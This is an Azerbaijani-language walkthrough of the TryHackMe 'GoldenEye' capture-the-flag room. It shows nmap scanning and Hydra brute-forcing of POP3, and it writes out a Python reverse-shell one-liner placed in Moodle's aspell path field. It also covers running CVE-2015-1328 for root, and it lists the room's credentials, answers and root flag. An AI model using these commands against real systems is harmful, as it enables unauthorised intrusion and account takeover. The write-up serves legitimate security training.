# 🕵️ TryHackMe — GoldenEye | Azərbaycan Dilli Writeup

**Çətinlik Səviyyəsi:** Orta (Medium)  
**Kateqoriya:** Pentest, Veb, Kriptoqrafiya, Steqanoqrafiya, Privilege Escalation  
**Platforma:** [TryHackMe — GoldenEye](https://tryhackme.com/room/goldeneye)  
**Hədəf OS:** Ubuntu Linux (Kernel 3.13.0)  
**Mövzu:** James Bond Stilli CTF 🎯

---

## 📌 Giriş

GoldenEye — James Bond filmindən ilham alaraq hazırlanmış yönləndirilmiş (guided) bir CTF tapşırığıdır. Bu otaqda aşağıdakı bacarıqlar tələb olunur:

- Şəbəkə kəşfiyyatı (Nmap)
- HTML Entity və Base64 kriptoqrafiyası
- POP3 e-poçt protokolunun araşdırılması
- Hydra ilə brute-force hücumu
- Steqanoqrafiya (şəkil içərisindəki gizli məlumat)
- Moodle CMS üzərindən reverse shell
- CVE-2015-1328 Linux kernel zəifliyi ilə root almaq

---

## 🗺️ Hücum Xəritəsi (Attack Path)

```
[Nmap Skan] → [4 açıq port: 25, 80, 55006, 55007]
      ↓
[Port 80 — Veb Sayt] → [terminal.js → HTML Entity şifrəsi]
      ↓
[Boris parolu: InvincibleHack3r] → [POP3-da işləmir]
      ↓
[Hydra Brute-Force] → [natalya:bird, boris:secret1!]
      ↓
[POP3 Emailləri] → [xenia:RCP90rulez! + severnaya-station.com]
      ↓
[Moodle saytı] → [doak istifadəçisi tapıldı]
      ↓
[Hydra] → [doak:goat] → [POP3 email] → [dr_doak:4England!]
      ↓
[Moodle → şəkil yükləndi] → [ExifTool + Base64] → [admin şifrəsi]
      ↓
[Moodle Admin → Aspell plugin] → [Python Reverse Shell]
      ↓
[www-data shell] → [CVE-2015-1328 exploit] → [ROOT 🎯]
```

---

## 🛠️ İstifadə Edilən Alətlər

| Alət | Məqsəd |
|------|--------|
| **nmap** | Port skanı |
| **telnet** | POP3 protokolu ilə əl ilə e-poçt oxumaq |
| **hydra** | POP3 üçün parol brute-force |
| **wget** | Faylları endirmək |
| **exiftool** | Şəkil metadata-sı |
| **base64** | Şifrəni açmaq |
| **CyberChef** | HTML Entity decode etmək |
| **netcat (nc)** | Reverse shell dinləmək |
| **Python** | Reverse shell yaratmaq |
| **gcc / cc** | C exploit-i compile etmək |
| **sed** | Fayl içindəki mətn dəyişdirmək |

---

## 🔍 Mərhələ 1 — Enumeration (Kəşfiyyat)

### 1.1 — Nmap ilə Tam Port Skanı

```bash
sudo nmap -p- -sS -sC -sV -O 10.10.74.5
```

**Parametrlərin izahı:**

| Parametr | Mənası |
|----------|--------|
| `-p-` | Bütün 65535 portu yoxla (default yalnız 1000-dir) |
| `-sS` | SYN/Stealth skan — tam TCP bağlantısı açmadan sürətli skan |
| `-sC` | Default NSE skriptlərini işlət — servis haqqında əlavə info topla |
| `-sV` | Servis versiyasını aşkarla |
| `-O` | Əməliyyat sistemi aşkarlamağa çalış |

**Nəticə:**

```
PORT      STATE SERVICE     VERSION
25/tcp    open  smtp        Postfix smtpd
80/tcp    open  http        Apache httpd 2.4.7 (Ubuntu)
55006/tcp open  ssl/unknown
55007/tcp open  pop3        Dovecot pop3d
```

**Nəyi öyrəndik?**

- **Port 25 — SMTP:** E-poçt göndərmə protokolu. Postfix proqramı işləyir.
- **Port 80 — HTTP:** Apache veb server. Əsas veb sayt buradadır.
- **Port 55006 — SSL:** Şifrəli bilinməyən servis. Standart port deyil — şübhəlidir.
- **Port 55007 — POP3:** E-poçt oxuma protokolu (Post Office Protocol v3). Dovecot proqramı işləyir. **Bu bizim əsas hədəflərimizdən biridir.**

Cavab: **4 port açıqdır.**

---

### 1.2 — Veb Saytı Araşdırmaq (Port 80)

Brauzerdə `http://10.10.74.5/` açırıq. Məzmun:

```
Severnaya Auxiliary Control Station
****TOP SECRET ACCESS****
Server Name: GOLDENEYE
User: UNKNOWN
Navigate to /sev-home/ to login
```

Saytın mənbə koduna baxırıq (`Ctrl+U` və ya `View Source`). Bir JavaScript faylı var:

```
view-source:http://10.10.74.5/terminal.js
```

---

### 1.3 — terminal.js Faylını Analiz Etmək

```javascript
var data = [
  {
    GoldenEyeText: "<span><br/>Severnaya Auxiliary Control Station..."
  },
];

//
// Boris, make sure you update your default password.
// My sources say MI6 maybe planning to infiltrate.
// Be on the lookout for any suspicious network traffic....
//
// I encoded you p@ssword below...
//
// &#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
//
// BTW Natalya says she can break your codes
//
```

**Burada nə tapıldı?**

1. **Boris** adlı istifadəçi var — şifrəsini yeniləməlidir
2. **Natalya** adlı başqa bir istifadəçi var
3. Şifrə **HTML Entity** formatında kodlanıb

---

### 1.4 — HTML Entity Şifrəsini Açmaq

**HTML Entity nədir?** HTML-də bəzi simvollar `&#` + rəqəm + `;` formatında yazılır. Məsələn:
- `&#73;` = `I`
- `&#110;` = `n`
- `&#118;` = `v`

Bu format veb brauzerlər tərəfindən avtomatik çevrilir. Biz açmaq üçün **CyberChef** istifadə edirik.

**CyberChef** — GCHQ (Britaniya kəşfiyyat xidməti) tərəfindən yaradılmış açıq mənbəli onlayn kriptoqrafiya alətidir.

**Addım:**
1. [CyberChef](https://gchq.github.io/CyberChef) saytına gedirik
2. "From HTML Entity" əməliyyatını seçirik
3. Bu kodu daxil edirik:
   `&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;`
4. Nəticə: **`InvincibleHack3r`**

Beləliklə:
- **İstifadəçi:** `boris`
- **Şifrə:** `InvincibleHack3r`

---

## 📧 Mərhələ 2 — POP3 E-Poçt Sistemi

### POP3 nədir?

POP3 (Post Office Protocol version 3) — server üzərindəki e-poçt qutusundan məktubları oxumağa imkan verən protokoldur. Biz `telnet` aləti ilə bu protokolla əl ilə (manually) işləyə bilərik.

---

### 2.1 — Boris-in Parolunu POP3-də Sınamaq

```bash
telnet 10.10.74.5 55007
```

**Telnet nədir?** Şifrəsiz uzaqdan terminal bağlantısı protokolu. Burada POP3 serverinə birbaşa əmrlər göndərmək üçün istifadə edirik.

```
+OK GoldenEye POP3 Electronic-Mail System
USER boris
+OK
PASS InvincibleHack3r
-ERR [AUTH] Authentication failed.
```

**Nəticə:** Boris-in veb şifrəsi POP3-də işləmir. Deməli, POP3 üçün fərqli şifrə var. Brute-force lazımdır.

---

### 2.2 — Hydra ilə Brute-Force (natalya üçün)

**Hydra nədir?** Müxtəlif protokollara qarşı avtomatik parol sınama (brute-force) alətidir. Söz siyahısındakı hər parolu sıra ilə sınayır.

```bash
hydra -l natalya -P /usr/share/wordlists/rockyou.txt pop3://10.10.74.5:55007
```

**Parametrlərin izahı:**

| Parametr | Mənası |
|----------|--------|
| `-l natalya` | Tək bir istifadəçi adı sına (kiçik `-l`) |
| `-P rockyou.txt` | Bu söz siyahısındakı bütün parolları sına (böyük `-P`) |
| `pop3://10.10.74.5:55007` | Hədəf — POP3 protokolu, IP ünvanı, port |

**rockyou.txt nədir?** 2009-cu ildə RockYou.com şirkətindən sızdırılmış 14 milyondan çox real istifadəçi şifrəsini ehtiva edən söz siyahısı. Penetrasyon testlərinin standart resursu.

**Nəticə:**

```
[55007][pop3] login: natalya   password: bird
```

---

### 2.3 — Hydra ilə Brute-Force (boris üçün)

```bash
hydra -l boris -P /usr/share/wordlists/rockyou.txt pop3://10.10.74.5:55007
```

**Nəticə:**

```
[55007][pop3] login: boris   password: secret1!
```

---

### 2.4 — Natalya-nın E-Poçtlarını Oxumaq

```bash
telnet 10.10.74.5 55007
```

```
USER natalya
+OK
PASS bird
+OK Logged in.

LIST
+OK 2 messages:
1 631
2 1048
```

**POP3 əmrlərinin izahı:**

| Əmr | Mənası |
|-----|--------|
| `USER [ad]` | İstifadəçi adını göndər |
| `PASS [şifrə]` | Şifrəni göndər |
| `LIST` | Gələn qutusdakı mesajların siyahısını göstər (nömrə + ölçü) |
| `RETR [nömrə]` | Həmin nömrəli mesajı göstər |
| `quit` | Bağlantını bağla |

**Birinci email (`RETR 1`):**

```
From: root@ubuntu

Natalya, please you need to stop breaking boris' codes.
Also, you are GNO supervisor for training.
Also, be cautious of possible network breaches.
We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
```

**İkinci email (`RETR 2`):**

```
From: root@ubuntu

Ok Natalyn I have a new student for you.

username: xenia
password: RCP90rulez!

And the URL on our internal Domain: severnaya-station.com/gnocertdir
Make sure to edit your host file since you usually work remote off-network....
Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
```

**Kritik məlumatlar tapıldı:**
- Yeni istifadəçi: `xenia` / `RCP90rulez!`
- Daxili sayt: `severnaya-station.com/gnocertdir`

---

## 🌐 Mərhələ 3 — Moodle CMS Araşdırması

### 3.1 — /etc/hosts Faylını Yeniləmək

Natalya-nın emailindəki daxili sayta çatmaq üçün öz kompüterimizdə DNS qeydi əlavə etməliyik.

```bash
echo "10.10.74.5 severnaya-station.com" >> /etc/hosts
```

**Niyə?** `severnaya-station.com` domeninin real internet DNS serverlərində qeydi yoxdur — bu yalnız daxili şəbəkə adresidir. `/etc/hosts` faylı kompüterin DNS sorğusu göndərməzdən əvvəl yoxladığı lokal "telefon kitabçası"dır. Buraya əlavə etdikdə brauzer bu domen adını birbaşa bizim göstərdiyimiz IP-yə yönləndirir.

**Windows üçün eyni fayl:**
```
C:\Windows\System32\Drivers\etc\hosts
```

---

### 3.2 — Moodle Saytına Giriş

```
http://severnaya-station.com/gnocertdir
```

**Moodle nədir?** Açıq mənbəli online öyrənmə idarəetmə sistemi (LMS). Universitetlər və şirkətlər tərəfindən tədris materialları paylaşmaq üçün geniş istifadə olunur.

`xenia:RCP90rulez!` ilə giriş edirik — uğurlu!

Saytı araşdırarkən başqa bir istifadəçi tapırıq: **`doak`**

---

### 3.3 — doak Üçün Hydra ilə Brute-Force

```bash
hydra -l doak -P /usr/share/wordlists/rockyou.txt pop3://10.10.74.5:55007
```

**Nəticə:**

```
[55007][pop3] login: doak   password: goat
```

---

### 3.4 — doak-in E-Poçtunu Oxumaq

```bash
telnet 10.10.74.5 55007
USER doak
PASS goat
LIST
+OK 1 messages:
1 606
RETR 1
```

**Email məzmunu:**

```
James,
If you're reading this, congrats you've gotten this far.

Go to our training site and login to my account....
dig until you can exfiltrate further information......

username: dr_doak
password: 4England!
```

Yeni istifadəçi tapıldı: **`dr_doak` / `4England!`**

---

### 3.5 — dr_doak Hesabında Faylları Araşdırmaq

`dr_doak:4England!` ilə Moodle-a giriş edirik. Bu istifadəçinin şəxsi fayllarında yazılıb:

```
007,

I was able to capture this apps adm1n cr3ds through clear txt.
Text throughout most web apps within the GoldenEye servers are scanned,
so I cannot add the cr3dentials here.

Something juicy is located here: /dir007key/for-007.jpg
```

---

## 🖼️ Mərhələ 4 — Steqanoqrafiya (Şəkildən Gizli Məlumat Çıxarmaq)

### Steqanoqrafiya nədir?

Steqanoqrafiya — məlumatı başqa bir medianın (şəkil, audio, video) içərisinə gizlətmə sənətidir. Kriptoqrafiyadan fərqli olaraq, burada məlumatın mövcudluğu gizlədilir — varlığı görünmür. Bu halda məlumat şəklin EXIF metadata sahəsindədir.

---

### 4.1 — Şəkli Endirmək

```bash
wget http://10.10.74.5/dir007key/for-007.jpg
```

**wget nədir?** Komanda xəttindən URL vasitəsilə fayl endirən alət. HTTP, HTTPS, FTP protokollarını dəstəkləyir.

---

### 4.2 — ExifTool ilə Metadata Analizi

```bash
exiftool for-007.jpg
```

**ExifTool nədir?** Şəkil, audio, video fayllarının EXIF metadata-sını oxuyan alət. EXIF (Exchangeable Image File Format) — kameralar tərəfindən şəkilin içinə yazılan məlumatlar toplusudur: tarix, GPS koordinatları, kamera modeli, istifadəçi şərhləri və s.

**Nəticə (vacib hissə):**

```
Image Description : eFdpbnRlcjE5OTV4IQ==
Make              : GoldenEye
Artist            : For James
User Comment      : For 007
```

`Image Description` sahəsindəki dəyər — `eFdpbnRlcjE5OTV4IQ==` — **Base64** formatında kodlanıb. `==` sonu Base64-ün tipik əlamətidir.

---

### 4.3 — Base64 Kodunu Açmaq

**Base64 nədir?** İkili (binary) məlumatı yalnız ASCII simvollarla ifadə etmək üçün kodlama sxemi. Şifrə deyil — sadəcə format çevirməsidir. Hər kəs açа bilər.

```bash
echo 'eFdpbnRlcjE5OTV4IQ==' | base64 -d
```

**Bu əmrin izahı:**

| Hissə | Mənası |
|-------|--------|
| `echo '...'` | Mətni çıxışa göndər |
| `\|` (pipe) | Əvvəlki əmrin çıxışını sonrakının girişinə yönləndir |
| `base64 -d` | Base64-ü deşifrə et (`-d` = decode) |

**Nəticə:**

```
xWinter1995x!
```

Bu — Moodle admin şifrəsidir!

---

### 4.4 — Moodle Admin Panelinə Giriş

`admin` / `xWinter1995x!` ilə Moodle-a admin kimi giriş edirik. İndi saytın bütün parametrlərinə çatmaq imkanımız var.

---

## 💻 Mərhələ 5 — Reverse Shell (Uzaqdan Əmr İcra Etmək)

### Reverse Shell nədir?

Normal halda biz hədəf serverə qoşulururuq (forward/direct connection). Reverse shell-də isə hədəf server **bizə** qoşulur. Biz əvvəlcədən port dinləyirik, sonra hədəfi bizə bağlanmağa məcbur edirik.

**Niyə reverse shell lazımdır?** Hədəf server çox vaxt firewall arxasındadır — dışarıdan birbaşa giriş bloklanıb. Amma hədəfin özünün dışarıya qoşulması adətən icazə verilib. Beləliklə, biz hücumu "içəridən" dışarıya çeviririk.

---

### 5.1 — Aspell Plugin Vasitəsilə Shell Yeritmək

Moodle admin panelindən:

1. **Site Administration → Server → System Paths** bölməsinə gedirik
2. **Path to aspell** sahəsini tapırıq

**Aspell nədir?** Orfoqrafiya yoxlama proqramı. Moodle yazı redaktorunda istifadə olunur. Admin olaraq bu proqramın yolunu dəyişib əvəzinə istənilən əmri yazа bilərik.

3. **Path to aspell** sahəsinə bu Python reverse shell kodunu daxil edirik:

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.106.222",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

**Bu kodun hissə-hissə izahı:**

| Kod hissəsi | Mənası |
|-------------|--------|
| `import socket,subprocess,os` | Lazımi Python kitabxanalarını yüklə |
| `s=socket.socket(AF_INET,SOCK_STREAM)` | Yeni TCP socket obyekti yarat |
| `s.connect(("10.8.106.222",4444))` | Bizim maşınımıza (IP:port) qoşul |
| `os.dup2(s.fileno(),0)` | `stdin`-i (klaviatura girişi) socket-ə yönləndir |
| `os.dup2(s.fileno(),1)` | `stdout`-u (ekran çıxışı) socket-ə yönləndir |
| `os.dup2(s.fileno(),2)` | `stderr`-i (xəta çıxışı) socket-ə yönləndir |
| `subprocess.call(["/bin/bash","-i"])` | İnteraktiv bash shell aç |

Nəticə: Hədəf server bizim IP-mizə qoşulur, biz onun bash terminalını idarə edirik.

---

### 5.2 — Netcat ilə Gələn Bağlantını Dinləmək

Shell kodu işləməzdən əvvəl öz maşınımızda dinləyici açmalıyıq:

```bash
nc -nlvp 4444
```

**Parametrlərin izahı:**

| Parametr | Mənası |
|----------|--------|
| `-n` | DNS sorğusu göndərmə, yalnız rəqəmsal IP istifadə et |
| `-l` | Dinləmə rejimi (listen mode) — gələn bağlantını gözlə |
| `-v` | Verbose — ətraflı çıxış göstər |
| `-p 4444` | 4444 portunda dinlə |

**Netcat nədir?** "Şəbəkənin İsveçrə bıçağı" — TCP/UDP bağlantıları yaratmaq, dinləmək, fayl ötürmək üçün universal alət.

Aspell yolunu saxladıqdan sonra Moodle-da yazı redaktorunu açıb orfoqrafiya yoxlama düyməsinə basırıq. Bu Python kodu işləyir!

**Netcat ekranında:**

```
connect to [10.8.106.222] from (UNKNOWN) [10.10.74.5] 35639
bash: cannot set terminal process group...
www-data@ubuntu:/..../spellchecker$
```

**Shell əldə etdik! Amma `www-data` istifadəçisiyik — root deyil.**

```bash
whoami
www-data

uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64
```

**Kernel versiyası:** `3.13.0-32` — bu **CVE-2015-1328** zəifliyinə qarşı həssasdır!

---

## ⬆️ Mərhələ 6 — Privilege Escalation (CVE-2015-1328)

### CVE-2015-1328 nədir?

**OverlayFS** — Linux kernelinin bir neçə fayl sistemini üst-üstə qatmağa imkan verən bir xüsusiyyətidir. Linux kernel versiyası **3.13.0 – 3.19** arasındakı sistemlərdə OverlayFS-in icazə yoxlamasındakı bir səhv, adi istifadəçinin root fayllarını dəyişdirməsinə imkan verir. Bu exploit 2015-ci ildə aşkar edilib və CVE nömrəsi `CVE-2015-1328`-dir.

**Exploit:** [Exploit-DB #37292](https://www.exploit-db.com/exploits/37292) — C dili ilə yazılmış hazır exploit kodu.

---

### 6.1 — Exploit Faylını Hədəfə Ötürmək

Hədəf maşın internet-ə çıxa bilmir. Buna görə exploit faylını **öz maşınımızdan** ötürəcəyik.

**Öz maşınımızda (Kali-də), exploit faylı olan qovluqda:**

```bash
python -m SimpleHTTPServer 1337
```

**Bu əmrin izahı:** Python-un daxili HTTP server modulunu işlədib cari qovluğun məzmununu port `1337`-də paylaşır. Sanki öz mini veb serverimizi açırıq. Hədəf maşın bu serverdən fayl endir bilər.

**Hədəf maşında (www-data shell-ində):**

```bash
wget 10.8.106.222:1337/37292.c
```

Bizim maşınımızdan `37292.c` exploit faylını hədəfə endirir.

---

### 6.2 — gcc Problemini Həll Etmək

C kodunu compile etmək üçün `gcc` lazımdır:

```bash
gcc 37292.c -o exploit
```

**Xəta:**

```
The program 'gcc' is currently not installed.
```

`gcc` yoxdur! Alternativ yoxlayırıq:

```bash
which cc
/usr/bin/cc
```

`cc` var! `cc` — C Compiler-in alternativ adıdır (çox vaxt `gcc`-yə simlink olur).

İndi exploit faylının içindəki bütün `gcc` sözlərini `cc` ilə əvəz edirik:

```bash
sed -i "s/gcc/cc/g" 37292.c
```

**`sed` nədir?** Stream Editor — fayl içindəki mətni avtomatik tapıb dəyişdirən komanda xətti aləti.

**Bu əmrin hissə-hissə izahı:**

| Hissə | Mənası |
|-------|--------|
| `sed` | Stream editor aləti |
| `-i` | Faylı bilavasitə (in-place) dəyişdir, yeni fayl yaratma |
| `"s/gcc/cc/g"` | `s` = substitute (əvəzlə); `gcc`-ni tap, `cc` ilə əvəzlə; `g` = global (bütün hallarda) |
| `37292.c` | Dəyişdiriləcək fayl |

---

### 6.3 — Exploit-i Compile Etmək

```bash
cc 37292.c -o exploit
```

**Bu əmrin izahı:**

| Hissə | Mənası |
|-------|--------|
| `cc` | C compiler |
| `37292.c` | Giriş faylı (C mənbə kodu) |
| `-o exploit` | Çıxış faylının adı — `exploit` adlı icra edilə bilən fayl yaradır |

Compile zamanı bəzi xəbərdarlıqlar (warnings) çıxır amma bu normaldır — kod işləyir.

---

### 6.4 — Exploit-i İşlətmək

```bash
./exploit
```

**`./` nə deməkdir?** Linux-da cari qovluqdakı icra edilə bilən faylı işlətmək üçün yazılır. Sistemin `$PATH` dəyişənindən kənar proqramlar bu cür işlədilir.

**Nəticə:**

```
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
sh: 0: can't access tty; job control turned off
#
```

`#` işarəsi — root shell-inin əlamətidir! 🎉

**Yoxlayırıq:**

```bash
whoami
root
```

**ROOT ƏLDƏ ETDİK! 🎉**

---

### 6.5 — Flagı Tapmaq

```bash
cat /root/.flag.txt
```

**Nəticə:**

```
Alec told me to place the codes here:

568628e0d993b1973adc718237da6e93

If you captured this make sure to go here.....
/006-final/xvf7-flag/
```

**Root flag:** `568628e0d993b1973adc718237da6e93`

---

## 📊 Bütün Sualların Xülasəsi

### Task 1 — Enumeration

| # | Sual | Cavab |
|---|------|-------|
| 2 | Neçə port açıqdır? | `4` |
| 4 | Kim şifrəsini yeniləməlidir? | `Boris` |
| 5 | Onun şifrəsi nədir? | `InvincibleHack3r` |

### Task 2 — Mail Time

| # | Sual | Cavab |
|---|------|-------|
| 3 | Natalya-nın yeni şifrəsi? | `bird` |
| 5 | Port 55007-də hansı servis? | `pop3` |
| 7 | Bu servisdə nə tapıldı? | `emails` |
| 8 | Boris-in kodlarını kim qıra bilər? | `Natalya` |

### Task 3 — GoldenEye Operators Training

| # | Sual | Cavab |
|---|------|-------|
| 4 | Moodle-da başqa hansı istifadəçi var? | `doak` |
| 5 | Onun şifrəsi? | `goat` |
| 8 | doak-in emailindən tapılan istifadəçi? | `dr_doak` |
| 9 | Onun şifrəsi? | `4England!` |

### Task 4 — Privilege Escalation

| # | Sual | Cavab |
|---|------|-------|
| 2 | Kernel versiyası? | `3.13.0-32-generic` |
| 4 | Hansı development aləti quraşdırılıb? | `cc` |
| 5 | Root flag? | `568628e0d993b1973adc718237da6e93` |

---

## 🔑 Tapılan Bütün Etimadnamələr (Credentials)

| İstifadəçi | Şifrə | Haradan tapıldı |
|------------|-------|-----------------|
| `boris` | `InvincibleHack3r` | HTML Entity (terminal.js) |
| `boris` | `secret1!` | Hydra brute-force (POP3) |
| `natalya` | `bird` | Hydra brute-force (POP3) |
| `xenia` | `RCP90rulez!` | Natalya-nın emaili (POP3) |
| `doak` | `goat` | Hydra brute-force (POP3) |
| `dr_doak` | `4England!` | doak-in emaili (POP3) |
| `admin` | `xWinter1995x!` | Şəkil EXIF → Base64 decode |

---

## 🎓 Öyrənilən Dərslər

### 1. Mənbə Kodu Həmişə Oxunmalıdır
`terminal.js` faylında həm istifadəçi adı, həm şifrə açıq şəkildə imiş. Veb saytların JavaScript/HTML fayllarını həmişə nəzərdən keçirin.

### 2. HTML Entity və Base64 Kodlama = Şifrə Deyil
`&#73;&#110;...` kimi HTML entity kodlaması heç bir təhlükəsizlik vermir — brauzer bu kodları avtomatik oxuyur. Base64 da eynən belədir: baxmaqla açılır. Bunlar şifrə (encryption) deyil, sadəcə kodlama (encoding) formatlarıdır.

### 3. Credential Stuffing — Tapılan Hər Parolu Hər Yerdə Sına
Bu CTF-də natalya, boris, doak — hər birini POP3-də, Moodle-da sınadıq. Çünki insanlar çox vaxt eyni şifrəni müxtəlif sistemlərdə istifadə edir.

### 4. EXIF Metadata Xəbərdarı Olmaq
Şəkilin Image Description sahəsindəki Base64 kodu admin şifrəsini gizlədirdi. Paylaşdığınız şəkillərin metadata-sını həmişə silin: `exiftool -all= fayl.jpg`

### 5. Kernel Versiyası = Potensial Exploit
`uname -a` kernel versiyasını verir. Köhnə kernel versiyaları ictimaiyyətə açıq exploit-lərə malikdir. Sistemlər mütəmadi yenilənməlidir.

### 6. `gcc` Olmasa `cc` Axtarılmalıdır
Hər sistemdə `gcc` quraşdırılmayıb. `which cc`, `which g++`, `which clang` ilə alternativlər axtarılır. `sed` ilə exploit kodunu uyğunlaşdırmaq isə çox praktik həlldir.

### 7. Admin Plugin Yollarına Diqqət
Moodle kimi CMS-lərdə sistem proqramlarının yolunu admin panelimizdən dəyişmək imkanı — yanlış konfiqurasiyada kritik zəifliyə çevrilir. Belə sahələr həmişə icazə ilə qorunmalıdır.

---

## ⚠️ Hüquqi Xəbərdarlıq

Bu writeup yalnız **TryHackMe platformasındakı nəzərdə tutulmuş CTF tapşırığı** üçün hazırlanmışdır. Burada öyrənilən metodları real insanlara ya da sistemlərə icazəsiz şəkildə tətbiq etmək **qeyri-qanuni** və **etikaya ziddir**. Bütün bacarıqları həmişə qanuni çərçivədə, icazə alınaraq istifadə edin.

---

*Writeup hazırladı: Azərbaycan dilli TryHackMe icması üçün*  
*Əsas mənbə: [khansiddique — GitHub](https://github.com/khansiddique/tryhackme-Rooms-Walkthrough/blob/master/GoldenEye/README.md)*
